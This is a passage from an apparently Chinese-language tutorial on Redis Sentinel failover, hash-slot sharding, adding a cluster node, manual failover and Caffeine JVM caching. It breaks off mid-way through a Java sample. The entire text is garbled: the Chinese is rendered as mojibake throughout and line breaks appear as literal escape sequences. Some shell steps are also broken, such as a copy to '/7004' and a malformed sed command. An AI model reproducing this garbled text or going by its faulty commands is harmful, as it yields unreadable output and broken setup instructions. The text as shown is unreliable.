slaveèŠ‚ç‚¹ç¬¬ä¸€æ¬¡è¿æ¥masterèŠ‚ç‚¹æ—¶\n- slaveèŠ‚ç‚¹æ–­å¼€æ—¶é—´å¤ªä¹…ï¼Œrepl_baklogä¸­çš„offsetå·²ç»è¢«è¦†ç›–æ—¶\n\nä»€ä¹ˆæ—¶å€™æ‰§è¡Œå¢é‡åŒæ­¥ï¼Ÿ\n\n- slaveèŠ‚ç‚¹æ–­å¼€åˆæ¢å¤ï¼Œå¹¶ä¸”åœ¨repl_baklogä¸­èƒ½æ‰¾åˆ°offsetæ—¶\n\n## â‘¢Rediså“¨å…µ\n\n### â¶å“¨å…µç»“æ„å’Œä½œç”¨\n\nRedisæä¾›äº†å“¨å…µï¼ˆSentinelï¼‰æœºåˆ¶æ¥å®ç°ä¸»ä»é›†ç¾¤çš„è‡ªåŠ¨æ•…éšœæ¢å¤ã€‚\n\n![å“¨å…µçš„ç»“æ„](https://img.jwt1399.top/img/202210242243769.png)\n\nå“¨å…µçš„ä½œç”¨å¦‚ä¸‹ï¼š\n\n- **ç›‘æ§**ï¼šSentinelä¼šä¸æ–­æ£€æŸ¥æ‚¨çš„masterå’Œslaveæ˜¯å¦æŒ‰é¢„æœŸå·¥ä½œ\n- **è‡ªåŠ¨æ•…éšœæ¢å¤**ï¼šå¦‚æœmasteræ•…éšœï¼ŒSentinelä¼šå°†ä¸€ä¸ªslaveæå‡ä¸ºmasterã€‚æ•…éšœå®ä¾‹æ¢å¤åä¹Ÿä»¥æ–°çš„masterä¸ºä¸»\n- **é€šçŸ¥**ï¼šSentinelå……å½“Rediså®¢æˆ·ç«¯çš„æœåŠ¡å‘ç°æ¥æºï¼Œå½“é›†ç¾¤å‘ç”Ÿæ•…éšœè½¬ç§»æ—¶ï¼Œå°†æœ€æ–°ä¿¡æ¯æ¨é€ç»™Redisçš„å®¢æˆ·ç«¯\n\n### â·é›†ç¾¤ç›‘æ§åŸç†\n\nSentinelåŸºäºå¿ƒè·³æœºåˆ¶ç›‘æµ‹æœåŠ¡çŠ¶æ€ï¼Œæ¯éš”1ç§’å‘é›†ç¾¤çš„æ¯ä¸ªå®ä¾‹å‘é€pingå‘½ä»¤ï¼š\n\n- ä¸»è§‚ä¸‹çº¿ï¼šå¦‚æœæŸsentinelèŠ‚ç‚¹å‘ç°æŸå®ä¾‹æœªåœ¨è§„å®šæ—¶é—´å“åº”ï¼Œåˆ™è®¤ä¸ºè¯¥å®ä¾‹**ä¸»è§‚ä¸‹çº¿**ã€‚\n\n- å®¢è§‚ä¸‹çº¿ï¼šè‹¥è¶…è¿‡æŒ‡å®šæ•°é‡ï¼ˆquorumï¼‰çš„sentineléƒ½è®¤ä¸ºè¯¥å®ä¾‹ä¸»è§‚ä¸‹çº¿ï¼Œåˆ™è¯¥å®ä¾‹**å®¢è§‚ä¸‹çº¿**ã€‚quorumå€¼æœ€å¥½è¶…è¿‡Sentinelå®ä¾‹æ•°é‡çš„ä¸€åŠã€‚\n\n### â¸é›†ç¾¤æ•…éšœæ¢å¤åŸç†\n\nä¸€æ—¦å‘ç°masteræ•…éšœï¼Œsentineléœ€è¦åœ¨salveä¸­é€‰æ‹©ä¸€ä¸ªä½œä¸ºæ–°çš„masterï¼Œé€‰æ‹©ä¾æ®æ˜¯è¿™æ ·çš„ï¼š\n\n- é¦–å…ˆä¼šåˆ¤æ–­slaveèŠ‚ç‚¹ä¸masterèŠ‚ç‚¹æ–­å¼€æ—¶é—´é•¿çŸ­ï¼Œå¦‚æœè¶…è¿‡æŒ‡å®šå€¼ï¼ˆdown-after-milliseconds * 10ï¼‰åˆ™ä¼šæ’é™¤è¯¥slaveèŠ‚ç‚¹\n- ç„¶ååˆ¤æ–­slaveèŠ‚ç‚¹çš„slave-priorityå€¼ï¼Œè¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼Œå¦‚æœæ˜¯0åˆ™æ°¸ä¸å‚ä¸é€‰ä¸¾\n- å¦‚æœslave-prorityä¸€æ ·ï¼Œåˆ™åˆ¤æ–­slaveèŠ‚ç‚¹çš„offsetå€¼ï¼Œè¶Šå¤§è¯´æ˜æ•°æ®è¶Šæ–°ï¼Œä¼˜å…ˆçº§è¶Šé«˜\n- æœ€åæ˜¯åˆ¤æ–­slaveèŠ‚ç‚¹çš„è¿è¡Œidå¤§å°ï¼Œè¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‚\n\nå½“é€‰å‡ºä¸€ä¸ªæ–°çš„masteråï¼Œè¯¥å¦‚ä½•å®ç°åˆ‡æ¢å‘¢ï¼Ÿæµç¨‹å¦‚ä¸‹ï¼š\n\n- sentinelç»™å¤‡é€‰çš„slaveèŠ‚ç‚¹å‘é€`slaveof no one`å‘½ä»¤ï¼Œè®©è¯¥èŠ‚ç‚¹æˆä¸ºmaster\n- sentinelç»™æ‰€æœ‰å…¶å®ƒslaveå‘é€`slaveof 192.168.150.101 7002`å‘½ä»¤ï¼ˆå¤‡é€‰slaveçš„åœ°å€å’Œç«¯å£ï¼‰ ï¼Œè®©è¿™äº›slaveæˆä¸ºæ–°masterçš„ä»èŠ‚ç‚¹ï¼Œå¼€å§‹ä»æ–°çš„masterä¸ŠåŒæ­¥æ•°æ®ã€‚\n- æœ€åï¼Œsentinelå°†æ•…éšœèŠ‚ç‚¹æ ‡è®°ä¸ºslaveï¼Œå½“æ•…éšœèŠ‚ç‚¹æ¢å¤åä¼šè‡ªåŠ¨æˆä¸ºæ–°çš„masterçš„slaveèŠ‚ç‚¹\n\n![](https://img.jwt1399.top/img/202210242247262.png)\n\n### â¹æ€»ç»“\n\nSentinelçš„ä¸‰ä¸ªä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- ç›‘æ§\n- æ•…éšœè½¬ç§»\n- é€šçŸ¥\n\nSentinelå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªrediså®ä¾‹æ˜¯å¦å¥åº·ï¼Ÿ\n\n- æ¯éš”1ç§’å‘é€ä¸€æ¬¡pingå‘½ä»¤ï¼Œå¦‚æœè¶…è¿‡ä¸€å®šæ—¶é—´æ²¡æœ‰å“åº”åˆ™è®¤ä¸ºæ˜¯ä¸»è§‚ä¸‹çº¿\n- å¦‚æœå¤§å¤šæ•°sentineléƒ½è®¤ä¸ºå®ä¾‹ä¸»è§‚ä¸‹çº¿ï¼Œåˆ™åˆ¤å®šæœåŠ¡ä¸‹çº¿\n\næ•…éšœè½¬ç§»æ­¥éª¤æœ‰å“ªäº›ï¼Ÿ\n\n- é¦–å…ˆé€‰å®šä¸€ä¸ªslaveä½œä¸ºæ–°çš„masterï¼Œæ‰§è¡Œslaveof no one\n- ç„¶åè®©æ‰€æœ‰èŠ‚ç‚¹éƒ½æ‰§è¡Œslaveof æ–°master\n- ä¿®æ”¹æ•…éšœèŠ‚ç‚¹é…ç½®ï¼Œæ·»åŠ slaveof æ–°master\n\n## â‘£Redisåˆ†ç‰‡é›†ç¾¤\n\n### â¶åˆ†ç‰‡é›†ç¾¤ç»“æ„\n\nä¸»ä»å’Œå“¨å…µå¯ä»¥è§£å†³é«˜å¯ç”¨ã€é«˜å¹¶å‘è¯»çš„é—®é¢˜ã€‚ä½†æ˜¯ä¾ç„¶æœ‰ä¸¤ä¸ªé—®é¢˜æ²¡æœ‰è§£å†³ï¼š\n\n- æµ·é‡æ•°æ®å­˜å‚¨é—®é¢˜\n\n- é«˜å¹¶å‘å†™çš„é—®é¢˜\n\nä½¿ç”¨åˆ†ç‰‡é›†ç¾¤å¯ä»¥è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå¦‚å›¾:\n\n<img src=\"https://img.jwt1399.top/img/202210242253041.png\" style=\"zoom:50%;\" />\n\n\n\nåˆ†ç‰‡é›†ç¾¤ç‰¹å¾ï¼š\n\n- é›†ç¾¤ä¸­æœ‰å¤šä¸ªmasterï¼Œæ¯ä¸ªmasterä¿å­˜ä¸åŒæ•°æ®\n\n- æ¯ä¸ªmasteréƒ½å¯ä»¥æœ‰å¤šä¸ªslaveèŠ‚ç‚¹\n\n- masterä¹‹é—´é€šè¿‡pingç›‘æµ‹å½¼æ­¤å¥åº·çŠ¶æ€\n\n- å®¢æˆ·ç«¯è¯·æ±‚å¯ä»¥è®¿é—®é›†ç¾¤ä»»æ„èŠ‚ç‚¹ï¼Œæœ€ç»ˆéƒ½ä¼šè¢«è½¬å‘åˆ°æ­£ç¡®èŠ‚ç‚¹\n\n### â·æ•£åˆ—æ’æ§½\n\nRedisä¼šæŠŠæ¯ä¸€ä¸ªmasterèŠ‚ç‚¹æ˜ å°„åˆ°0~16383å…±16384ä¸ªæ’æ§½ï¼ˆhash slotï¼‰ä¸Šï¼ŒæŸ¥çœ‹é›†ç¾¤ä¿¡æ¯æ—¶(`cluster nodes`)å°±èƒ½çœ‹åˆ°ï¼š\n\n![](https://img.jwt1399.top/img/202210242259764.png)\n\næ•°æ®keyä¸æ˜¯ä¸èŠ‚ç‚¹ç»‘å®šï¼Œè€Œæ˜¯ä¸æ’æ§½ç»‘å®šã€‚redisä¼šæ ¹æ®keyçš„æœ‰æ•ˆéƒ¨åˆ†è®¡ç®—æ’æ§½å€¼ï¼Œåˆ†ä¸¤ç§æƒ…å†µï¼š\n\n- keyä¸­åŒ…å«\"{}\"ï¼Œä¸”â€œ{}â€ä¸­è‡³å°‘åŒ…å«1ä¸ªå­—ç¬¦ï¼Œâ€œ{}â€ä¸­çš„éƒ¨åˆ†æ˜¯æœ‰æ•ˆéƒ¨åˆ†\n- keyä¸­ä¸åŒ…å«â€œ{}â€ï¼Œæ•´ä¸ªkeyéƒ½æ˜¯æœ‰æ•ˆéƒ¨åˆ†\n\nä¾‹å¦‚ï¼škeyæ˜¯numï¼Œé‚£ä¹ˆå°±æ ¹æ®numè®¡ç®—ï¼Œå¦‚æœæ˜¯{jianjian}numï¼Œåˆ™æ ¹æ®jianjianè®¡ç®—ã€‚è®¡ç®—æ–¹å¼æ˜¯åˆ©ç”¨CRC16ç®—æ³•å¾—åˆ°ä¸€ä¸ªhashå€¼ï¼Œç„¶åå¯¹16384å–ä½™ï¼ˆCRC16(key) % 16384 ï¼‰ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯slotå€¼ã€‚\n\n![](https://img.jwt1399.top/img/202210242304617.png) \n\nå¦‚å›¾åœ¨7001è¿™ä¸ªèŠ‚ç‚¹æ‰§è¡Œset a 1æ—¶ï¼Œå¯¹aåšhashè¿ç®—ï¼Œå¯¹16384å–ä½™ï¼Œå¾—åˆ°çš„ç»“æœ15495ï¼Œå› æ­¤è¦å­˜å‚¨åˆ°7003èŠ‚ç‚¹ã€‚åˆ°äº†7003åï¼Œæ‰§è¡Œ`get num`æ—¶ï¼Œå¯¹numåšhashè¿ç®—ï¼Œå¯¹16384å–ä½™ï¼Œå¾—åˆ°çš„ç»“æœ2765ï¼Œå› æ­¤éœ€è¦åˆ‡æ¢åˆ°7001èŠ‚ç‚¹\n\n**æ€»ç»“**\n\nRediså¦‚ä½•åˆ¤æ–­æŸä¸ªkeyåº”è¯¥åœ¨å“ªä¸ªå®ä¾‹ï¼Ÿ\n\n- å°†16384ä¸ªæ’æ§½åˆ†é…åˆ°ä¸åŒçš„å®ä¾‹\n- æ ¹æ®keyçš„æœ‰æ•ˆéƒ¨åˆ†è®¡ç®—å“ˆå¸Œå€¼ï¼Œå¯¹16384å–ä½™\n- ä½™æ•°ä½œä¸ºæ’æ§½ï¼Œå¯»æ‰¾æ’æ§½æ‰€åœ¨å®ä¾‹å³å¯\n\nå¦‚ä½•å°†åŒä¸€ç±»æ•°æ®å›ºå®šçš„ä¿å­˜åœ¨åŒä¸€ä¸ªRediså®ä¾‹ï¼Ÿ\n\n- è¿™ä¸€ç±»æ•°æ®ä½¿ç”¨ç›¸åŒçš„æœ‰æ•ˆéƒ¨åˆ†ï¼Œä¾‹å¦‚keyéƒ½ä»¥{typeId}ä¸ºå‰ç¼€\n\n### â¸é›†ç¾¤ä¼¸ç¼©\n\nredis-cli --clusteræä¾›äº†å¾ˆå¤šæ“ä½œé›†ç¾¤çš„å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢æ–¹å¼æŸ¥çœ‹ï¼š\n\n![](https://img.jwt1399.top/img/202210242319401.png)\n\n#### 1.éœ€æ±‚åˆ†æ\n\néœ€æ±‚ï¼šå‘é›†ç¾¤ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„masterèŠ‚ç‚¹ï¼Œå¹¶å‘å…¶ä¸­å­˜å‚¨ num = 10\n\n- å¯åŠ¨ä¸€ä¸ªæ–°çš„rediså®ä¾‹ï¼Œç«¯å£ä¸º7004\n- æ·»åŠ 7004åˆ°ä¹‹å‰çš„é›†ç¾¤ï¼Œå¹¶ä½œä¸ºä¸€ä¸ªmasterèŠ‚ç‚¹\n- ç»™7004èŠ‚ç‚¹åˆ†é…æ’æ§½ï¼Œä½¿å¾—numè¿™ä¸ªkeyå¯ä»¥å­˜å‚¨åˆ°7004å®ä¾‹\n\nè¿™é‡Œéœ€è¦ä¸¤ä¸ªæ–°çš„åŠŸèƒ½ï¼š\n\n- æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹åˆ°é›†ç¾¤ä¸­\n- å°†éƒ¨åˆ†æ’æ§½åˆ†é…åˆ°æ–°æ’æ§½\n\n#### 2.åˆ›å»ºæ–°çš„rediså®ä¾‹\n\nåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼š\n\n```sh\nmkdir 7004\n```\n\næ‹·è´é…ç½®æ–‡ä»¶ï¼š\n\n```sh\ncp redis.conf /7004\n```\n\nä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š\n\n```sh\nsed /s/6379/7004/g 7004/redis.conf\n```\n\nå¯åŠ¨\n\n```sh\nredis-server 7004/redis.conf\n```\n\n#### 3.æ·»åŠ æ–°èŠ‚ç‚¹åˆ°redis\n\næ·»åŠ èŠ‚ç‚¹çš„è¯­æ³•å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202210242319022.png)\n\næ‰§è¡Œå‘½ä»¤ï¼š\n\n```sh\nredis-cli --cluster add-node  192.168.150.101:7004 192.168.150.101:7001\n```\n\né€šè¿‡å‘½ä»¤æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ï¼š\n\n```sh\nredis-cli -p 7001 cluster nodes\n```\n\nå¦‚å›¾ï¼Œ7004åŠ å…¥äº†é›†ç¾¤ï¼Œå¹¶ä¸”é»˜è®¤æ˜¯ä¸€ä¸ªmasterèŠ‚ç‚¹ï¼š\n\n![](https://img.jwt1399.top/img/202210242319028.png)\n\nä½†æ˜¯ï¼Œå¯ä»¥çœ‹åˆ°7004èŠ‚ç‚¹çš„æ’æ§½æ•°é‡ä¸º0ï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•æ•°æ®å¯ä»¥å­˜å‚¨åˆ°7004ä¸Š\n\n#### 4.è½¬ç§»æ’æ§½\n\næˆ‘ä»¬è¦å°†numå­˜å‚¨åˆ°7004èŠ‚ç‚¹ï¼Œå› æ­¤éœ€è¦å…ˆçœ‹çœ‹numçš„æ’æ§½æ˜¯å¤šå°‘ï¼š\n\n![](https://img.jwt1399.top/img/202210242320500.png)\n\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œnumçš„æ’æ§½ä¸º2765.\n\næˆ‘ä»¬å¯ä»¥å°†0~3000çš„æ’æ§½ä»7001è½¬ç§»åˆ°7004ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202210242320657.png)\n\nå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š\n\nå»ºç«‹è¿æ¥ï¼š\n\n![](https://img.jwt1399.top/img/202210242320294.png)\n\nå¾—åˆ°ä¸‹é¢çš„åé¦ˆï¼š\n\n![](https://img.jwt1399.top/img/202210242320458.png)\n\nè¯¢é—®è¦ç§»åŠ¨å¤šå°‘ä¸ªæ’æ§½ï¼Œæˆ‘ä»¬è®¡åˆ’æ˜¯3000ä¸ªï¼š\n\næ–°çš„é—®é¢˜æ¥äº†ï¼š\n\n![](https://img.jwt1399.top/img/202210242321392.png)\n\né‚£ä¸ªnodeæ¥æ¥æ”¶è¿™äº›æ’æ§½ï¼Ÿï¼Ÿ\n\næ˜¾ç„¶æ˜¯7004ï¼Œé‚£ä¹ˆ7004èŠ‚ç‚¹çš„idæ˜¯å¤šå°‘å‘¢ï¼Ÿ\n\n![](https://img.jwt1399.top/img/202210242321252.png)\n\nå¤åˆ¶è¿™ä¸ªidï¼Œç„¶åæ‹·è´åˆ°åˆšæ‰çš„æ§åˆ¶å°åï¼š\n\n![](https://img.jwt1399.top/img/202210242321161.png)\n\nè¿™é‡Œè¯¢é—®ï¼Œä½ çš„æ’æ§½æ˜¯ä»å“ªé‡Œç§»åŠ¨è¿‡æ¥çš„ï¼Ÿ\n\n- allï¼šä»£è¡¨å…¨éƒ¨ï¼Œä¹Ÿå°±æ˜¯ä¸‰ä¸ªèŠ‚ç‚¹å„è½¬ç§»ä¸€éƒ¨åˆ†\n- å…·ä½“çš„idï¼šç›®æ ‡èŠ‚ç‚¹çš„id\n- doneï¼šæ²¡æœ‰äº†\n\nè¿™é‡Œæˆ‘ä»¬è¦ä»7001è·å–ï¼Œå› æ­¤å¡«å†™7001çš„idï¼š\n\n![](https://img.jwt1399.top/img/202210242321637.png)\n\nå¡«å®Œåï¼Œç‚¹å‡»doneï¼Œè¿™æ ·æ’æ§½è½¬ç§»å°±å‡†å¤‡å¥½äº†ï¼š\n\n![](https://img.jwt1399.top/img/202210242322964.png)\n\nç¡®è®¤è¦è½¬ç§»å—ï¼Ÿè¾“å…¥yesï¼š\n\nç„¶åï¼Œé€šè¿‡å‘½ä»¤æŸ¥çœ‹ç»“æœï¼š\n\n![](https://img.jwt1399.top/img/202210242322787.png) \n\nå¯ä»¥çœ‹åˆ°ï¼š \n\n![](https://img.jwt1399.top/img/202210242322766.png)\n\nç›®çš„è¾¾æˆã€‚\n\n### â¹æ•…éšœè½¬ç§»\n\né›†ç¾¤åˆè¯†çŠ¶æ€æ˜¯è¿™æ ·çš„ï¼š\n\n![](https://img.jwt1399.top/img/202210242313025.png)\n\nå…¶ä¸­7001ã€7002ã€7003éƒ½æ˜¯masterï¼Œæˆ‘ä»¬è®¡åˆ’è®©7002å®•æœºã€‚\n\n#### 1.è‡ªåŠ¨æ•…éšœè½¬ç§»\n\nå½“é›†ç¾¤ä¸­æœ‰ä¸€ä¸ªmasterå®•æœºä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿç›´æ¥åœæ­¢ä¸€ä¸ªrediså®ä¾‹ï¼Œä¾‹å¦‚7002ï¼š\n\n```sh\nredis-cli -p 7002 shutdown\n```\n\n1ï¼‰é¦–å…ˆæ˜¯è¯¥å®ä¾‹ä¸å…¶å®ƒå®ä¾‹å¤±å»è¿æ¥ï¼Œç„¶åæ˜¯ç–‘ä¼¼å®•æœºï¼š\n\n![](https://img.jwt1399.top/img/202210242313432.png)\n\n2ï¼‰æœ€åæ˜¯ç¡®å®šä¸‹çº¿ï¼Œè‡ªåŠ¨æå‡ä¸€ä¸ªslaveä¸ºæ–°çš„masterï¼š\n\n![](https://img.jwt1399.top/img/202210242313025.png)\n\n3ï¼‰å½“7002å†æ¬¡å¯åŠ¨ï¼Œå°±ä¼šå˜ä¸ºä¸€ä¸ªslaveèŠ‚ç‚¹äº†ï¼š\n\n![](https://img.jwt1399.top/img/202210242313079.png)\n\n#### 2.æ‰‹åŠ¨æ•…éšœè½¬ç§»\n\nåˆ©ç”¨cluster failoverå‘½ä»¤å¯ä»¥æ‰‹åŠ¨è®©é›†ç¾¤ä¸­çš„æŸä¸ªmasterå®•æœºï¼Œåˆ‡æ¢åˆ°æ‰§è¡Œcluster failoverå‘½ä»¤çš„è¿™ä¸ªslaveèŠ‚ç‚¹ï¼Œå®ç°æ— æ„ŸçŸ¥çš„æ•°æ®è¿ç§»ã€‚å…¶æµç¨‹å¦‚ä¸‹ï¼š\n\n<img src=\"https://img.jwt1399.top/img/202210242314920.png\" style=\"zoom:50%;\" />\n\n\n\nè¿™ç§failoverå‘½ä»¤å¯ä»¥æŒ‡å®šä¸‰ç§æ¨¡å¼ï¼š\n\n- ç¼ºçœï¼šé»˜è®¤çš„æµç¨‹ï¼Œå¦‚å›¾1~6æ­©\n- forceï¼šçœç•¥äº†å¯¹offsetçš„ä¸€è‡´æ€§æ ¡éªŒ\n- takeoverï¼šç›´æ¥æ‰§è¡Œç¬¬5æ­©ï¼Œå¿½ç•¥æ•°æ®ä¸€è‡´æ€§ã€å¿½ç•¥masterçŠ¶æ€å’Œå…¶å®ƒmasterçš„æ„è§\n\n**æ¡ˆä¾‹éœ€æ±‚**ï¼šåœ¨7002è¿™ä¸ªslaveèŠ‚ç‚¹æ‰§è¡Œæ‰‹åŠ¨æ•…éšœè½¬ç§»ï¼Œé‡æ–°å¤ºå›masteråœ°ä½\n\n- 1ï¼‰åˆ©ç”¨redis-cliè¿æ¥7002è¿™ä¸ªèŠ‚ç‚¹\n\n- 2ï¼‰æ‰§è¡Œcluster failoverå‘½ä»¤\n\nå¦‚å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202210242314826.png)\n\næ•ˆæœï¼š\n\n![](https://img.jwt1399.top/img/202210242315932.png)\n\n# 4.å¤šçº§ç¼“å­˜\n\n## â‘ ä»€ä¹ˆæ˜¯å¤šçº§ç¼“å­˜\n\n**ä¼ ç»Ÿç¼“å­˜ç­–ç•¥**ä¸€èˆ¬æ˜¯è¯·æ±‚åˆ°è¾¾Tomcatåï¼Œå…ˆæŸ¥è¯¢Redisï¼Œå¦‚æœæœªå‘½ä¸­åˆ™æŸ¥è¯¢æ•°æ®åº“ï¼Œå­˜åœ¨ä¸‹é¢çš„é—®é¢˜ï¼š\n\n- è¯·æ±‚è¦ç»è¿‡Tomcatå¤„ç†ï¼ŒTomcatçš„æ€§èƒ½æˆä¸ºæ•´ä¸ªç³»ç»Ÿçš„ç“¶é¢ˆ\n\n- Redisç¼“å­˜å¤±æ•ˆæ—¶ï¼Œä¼šå¯¹æ•°æ®åº“äº§ç”Ÿå†²å‡»\n\n**å¤šçº§ç¼“å­˜ç­–ç•¥**å°±æ˜¯å……åˆ†åˆ©ç”¨è¯·æ±‚å¤„ç†çš„æ¯ä¸ªç¯èŠ‚ï¼Œåˆ†åˆ«æ·»åŠ ç¼“å­˜ï¼Œå‡è½»Tomcatå‹åŠ›ï¼Œæå‡æœåŠ¡æ€§èƒ½ï¼š\n\n- æµè§ˆå™¨è®¿é—®é™æ€èµ„æºæ—¶ï¼Œä¼˜å…ˆè¯»å–æµè§ˆå™¨æœ¬åœ°ç¼“å­˜\n- è®¿é—®éé™æ€èµ„æºï¼ˆajaxæŸ¥è¯¢æ•°æ®ï¼‰æ—¶ï¼Œè®¿é—®æœåŠ¡ç«¯\n- è¯·æ±‚åˆ°è¾¾Nginxåï¼Œä¼˜å…ˆè¯»å–Nginxæœ¬åœ°ç¼“å­˜\n- å¦‚æœNginxæœ¬åœ°ç¼“å­˜æœªå‘½ä¸­ï¼Œåˆ™å»ç›´æ¥æŸ¥è¯¢Redisï¼ˆä¸ç»è¿‡Tomcatï¼‰\n- å¦‚æœRedisæŸ¥è¯¢æœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢Tomcat\n- è¯·æ±‚è¿›å…¥Tomcatåï¼Œä¼˜å…ˆæŸ¥è¯¢JVMè¿›ç¨‹ç¼“å­˜\n- å¦‚æœJVMè¿›ç¨‹ç¼“å­˜æœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢æ•°æ®åº“\n\n|                       ä¼ ç»Ÿç¼“å­˜                       |                       å¤šçº§ç¼“å­˜                       |\n| :--------------------------------------------------: | :--------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/202210291820067.png) | ![](https://img.jwt1399.top/img/202210291820697.png) |\n\nåœ¨å¤šçº§ç¼“å­˜æ¶æ„ä¸­ï¼ŒNginxå†…éƒ¨éœ€è¦ç¼–å†™æœ¬åœ°ç¼“å­˜æŸ¥è¯¢ã€RedisæŸ¥è¯¢ã€TomcatæŸ¥è¯¢çš„ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤è¿™æ ·çš„nginxæœåŠ¡ä¸å†æ˜¯ä¸€ä¸ª**åå‘ä»£ç†æœåŠ¡å™¨**ï¼Œè€Œæ˜¯ä¸€ä¸ªç¼–å†™**ä¸šåŠ¡çš„WebæœåŠ¡å™¨äº†**ã€‚å› æ­¤è¿™æ ·çš„ä¸šåŠ¡Nginxä¹Ÿéœ€è¦æ­å»ºé›†ç¾¤æ¥æé«˜å¹¶å‘ï¼Œå†æœ‰ä¸“é—¨çš„nginxæœåŠ¡æ¥åšåå‘ä»£ç†ï¼Œå¦å¤–ï¼Œæˆ‘ä»¬çš„TomcatæœåŠ¡å°†æ¥ä¹Ÿä¼šéƒ¨ç½²ä¸ºé›†ç¾¤æ¨¡å¼ï¼š\n\n![](https://img.jwt1399.top/img/202210291819191.png)\n\nå¯è§ï¼Œå¤šçº§ç¼“å­˜çš„å…³é”®æœ‰ä¸¤ä¸ªï¼š\n\n- 1.åœ¨nginxä¸­ç¼–å†™ä¸šåŠ¡ï¼Œå®ç°nginxæœ¬åœ°ç¼“å­˜ã€Redisã€Tomcatçš„æŸ¥è¯¢ã€‚åˆ©ç”¨OpenRestyæ¡†æ¶ç»“åˆLuaå®ç°\n\n- 2.åœ¨Tomcatä¸­å®ç°JVMè¿›ç¨‹ç¼“å­˜ï¼Œåˆ©ç”¨Caffeineæ¡†æ¶æ¥å®ç°\n\n## â‘¡JVMè¿›ç¨‹ç¼“å­˜\n\n### â¶åˆè¯†Caffeine\n\nç¼“å­˜åœ¨æ—¥å¸¸å¼€å‘ä¸­å¯åŠ¨è‡³å…³é‡è¦çš„ä½œç”¨ï¼Œç”±äºæ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œæ•°æ®çš„è¯»å–é€Ÿåº¦æ˜¯éå¸¸å¿«çš„ï¼Œèƒ½å¤§é‡å‡å°‘å¯¹æ•°æ®åº“çš„è®¿é—®ï¼Œå‡å°‘æ•°æ®åº“çš„å‹åŠ›ã€‚æˆ‘ä»¬æŠŠç¼“å­˜åˆ†ä¸ºä¸¤ç±»ï¼š\n\n- åˆ†å¸ƒå¼ç¼“å­˜ï¼Œä¾‹å¦‚Redisï¼š\n  - ä¼˜ç‚¹ï¼šå­˜å‚¨å®¹é‡æ›´å¤§ã€å¯é æ€§æ›´å¥½ã€å¯ä»¥åœ¨é›†ç¾¤é—´å…±äº«\n  - ç¼ºç‚¹ï¼šè®¿é—®ç¼“å­˜æœ‰ç½‘ç»œå¼€é”€\n  - åœºæ™¯ï¼šç¼“å­˜æ•°æ®é‡è¾ƒå¤§ã€å¯é æ€§è¦æ±‚è¾ƒé«˜ã€éœ€è¦åœ¨é›†ç¾¤é—´å…±äº«\n- è¿›ç¨‹æœ¬åœ°ç¼“å­˜ï¼Œä¾‹å¦‚HashMapã€GuavaCacheï¼š\n  - ä¼˜ç‚¹ï¼šè¯»å–æœ¬åœ°å†…å­˜ï¼Œæ²¡æœ‰ç½‘ç»œå¼€é”€ï¼Œé€Ÿåº¦æ›´å¿«\n  - ç¼ºç‚¹ï¼šå­˜å‚¨å®¹é‡æœ‰é™ã€å¯é æ€§è¾ƒä½ã€æ— æ³•å…±äº«\n  - åœºæ™¯ï¼šæ€§èƒ½è¦æ±‚è¾ƒé«˜ï¼Œç¼“å­˜æ•°æ®é‡è¾ƒå°\n\næˆ‘ä»¬åˆ©ç”¨Caffeineæ¡†æ¶æ¥å®ç°JVMè¿›ç¨‹ç¼“å­˜ã€‚**Caffeine**æ˜¯ä¸€ä¸ªåŸºäºJava8å¼€å‘çš„ï¼Œæä¾›äº†è¿‘ä¹æœ€ä½³å‘½ä¸­ç‡çš„é«˜æ€§èƒ½çš„æœ¬åœ°ç¼“å­˜åº“ã€‚ç›®å‰Springå†…éƒ¨çš„ç¼“å­˜ä½¿ç”¨çš„å°±æ˜¯Caffeineã€‚GitHubåœ°å€ï¼šhttps://github.com/ben-manes/caffeine\n\nCaffeineçš„åŸºæœ¬APIï¼š\n\n```java\n@Test\nvoid testBasicOps() {\n    // æ„å»ºcacheå¯¹è±¡\n    Cache<String, String> cache = Caffeine.newBuilder().build();\n\n    // å­˜æ•°æ®\n    cache.put(\"gf\", \"è¿ªä¸½çƒ­å·´\");\n\n    // å–æ•°æ®\n    String gf = cache.getIfPresent(\"gf\");\n    System.out.println(\"gf = \" + gf);\n\n    // å–æ•°æ®ï¼ŒåŒ…å«ä¸¤ä¸ªå‚æ•°ï¼š\n    // å‚æ•°ä¸€ï¼šç¼“å­˜çš„key\n    // å‚æ•°äºŒï¼šLambdaè¡¨è¾¾å¼ï¼Œè¡¨è¾¾å¼å‚æ•°å°±æ˜¯ç¼“å­˜çš„keyï¼Œæ–¹æ³•ä½“æ˜¯æŸ¥è¯¢æ•°æ®åº“çš„é€»è¾‘\n    // ä¼˜å…ˆæ ¹æ®keyæŸ¥è¯¢JVMç¼“å­˜ï¼Œå¦‚æœæœªå‘½ä¸­ï¼Œåˆ™æ‰§è¡Œå‚æ•°äºŒçš„Lambdaè¡¨è¾¾å¼\n    String defaultGF = cache.get(\"defaultGF\", key -> {\n        // æ ¹æ®keyå»æ•°æ®åº“æŸ¥è¯¢æ•°æ®\n        return \"æŸ³å²©\";\n    });\n    System.out.println(\"defaultGF = \" + 